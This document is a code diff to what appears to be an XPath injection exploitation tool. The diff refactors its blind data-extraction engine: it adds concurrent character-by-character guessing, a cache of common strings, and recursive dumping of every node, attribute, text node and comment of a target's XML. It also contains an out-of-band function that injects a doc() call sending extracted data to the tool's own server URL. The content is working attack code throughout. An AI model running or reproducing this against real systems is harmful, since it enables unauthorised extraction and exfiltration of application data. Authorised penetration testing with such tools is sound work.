@@ -3,8 +3,11 @@ import asyncio
 
 from xcat.xpath.xpath_1 import string_length, substring_before, concat, string, normalize_space
 from xcat.xpath.xpath_2 import string_to_codepoints, doc, encode_for_uri
-from .requester import Requester
 from .xpath import xpath_1
+
+from .display import XMLNode
+from .requester import Requester
+from .xpath import ROOT_NODE
 
 ASCII_SEARCH_SPACE = stdlib_string.digits + stdlib_string.ascii_letters + '+./:@_ -,()!'
 MISSING_CHARACTER = "?"
@@ -35,6 +38,25 @@ async def get_char(requester: Requester, expression):
                 return space
 
 
+async def get_common_string(requester, expression, length):
+    if length >= 10:
+        return
+
+    common_names = [item[0] for item in requester.counters['common-strings'].most_common()
+                    if len(item[0]) == length][:5]
+    if common_names:
+        futures = [requester.check(expression == common_name) for common_name in common_names]
+        results = zip(await asyncio.gather(*futures), common_names)
+
+        for result, name in results:
+            if result:
+                requester.counters['common-string-results']['hit'] += 1
+                requester.counters['common-strings'][name] += 1
+                return name
+
+        requester.counters['common-string-results']['miss'] += 1
+
+
 async def get_string(requester: Requester, expression, disable_normalization=False):
     if requester.features['normalize-space'] and not disable_normalization:
         expression = normalize_space(expression)
@@ -46,25 +68,24 @@ async def get_string(requester: Requester, expression, disable_normalization=Fal
         else:
             pass
 
-    is_empty_str_expression = xpath_1.string_length(xpath_1.normalize_space(expression)) == 0
-
-    if await requester.check(is_empty_str_expression):
-        return ""
-
     total_string_length = await count(requester, expression, func=xpath_1.string_length)
 
-    if total_string_length <= 10:
-        # Try common strings we've got before
-        for common_name, _ in requester.counters['common-names'].most_common(5):
-            if await requester.check(expression == common_name):
-                return common_name
+    if total_string_length == 0:
+        return ""
+
+    # Try common strings we've got before
+    result = await get_common_string(requester, expression, total_string_length)
+    if result is not None:
+        return result
 
     fetch_length = total_string_length if not requester.fast else min(15, total_string_length)
 
-    chars = [
-        await get_char(requester, xpath_1.substring(expression, i, 1))
+    chars_futures = [
+        get_char(requester, xpath_1.substring(expression, i, 1))
         for i in range(1, fetch_length + 1)
         ]
+
+    chars = await asyncio.gather(*chars_futures)
 
     result = "".join(
         char if char is not None else MISSING_CHARACTER
@@ -76,7 +97,7 @@ async def get_string(requester: Requester, expression, disable_normalization=Fal
         return f'{result}... ({difference} more characters)'
     else:
         if len(result) <= 10:
-            requester.counters['common-names'][result] += 1
+            requester.counters['common-strings'][result] += 1
 
     return result
 
@@ -86,7 +107,8 @@ async def get_string_via_oob(requester: Requester, expression):
     url, future = server.expect_data()
 
     if not await requester.check(
-                    doc(concat(f'{url}?d=', encode_for_uri(expression))).add_path('/data') == server.test_response_value):
+                    doc(concat(f'{url}?d=', encode_for_uri(expression))).add_path(
+                        '/data') == server.test_response_value):
         return None
 
     try:
@@ -105,7 +127,7 @@ async def get_all_text(requester: Requester, expression):
     text_contents = [
         string
         async for string in iterate_all(requester, expression.text(text_node_count))
-    ]
+        ]
 
     return "".join(text_contents)
 
@@ -113,10 +135,9 @@ async def get_all_text(requester: Requester, expression):
 async def get_node_comments(requester: Requester, expression):
     comments_count = await count(requester, expression.comments)
 
-    return [
-        await get_string(requester, comment)
-        for comment in expression.comments(comments_count)
-    ]
+    futures = [get_string(requester, comment) for comment in expression.comments(comments_count)]
+
+    return await asyncio.gather(*futures)
 
 
 async def binary_search(requester: Requester, expression, min, max=25):
@@ -168,3 +189,27 @@ async def codepoint_search(requester: Requester, expression):
         return None
     else:
         return chr(result)
+
+
+async def get_nodes(requester: Requester, starting_path=ROOT_NODE):
+    attributes, child_node_count, text_content, comments, node_name = await asyncio.gather(
+        get_node_attributes(requester, starting_path),
+        count(requester, starting_path.children),
+        get_all_text(requester, starting_path),
+        get_node_comments(requester, starting_path),
+        get_string(requester, starting_path.name)
+    )
+
+    return (XMLNode(name=node_name, attributes=attributes, text=text_content, comments=comments),
+            [get_nodes(requester, starting_path=child) for child in starting_path.children(child_node_count)])
+
+
+async def get_node_attributes(requester: Requester, node):
+    attribute_count = await count(requester, node.attributes)
+
+    async def _get_attributes_task(attr):
+        return await asyncio.gather(get_string(requester, attr.name), get_string(requester, attr))
+
+    results = await asyncio.gather(*[_get_attributes_task(attr) for attr in node.attributes(attribute_count)])
+
+    return dict(results)
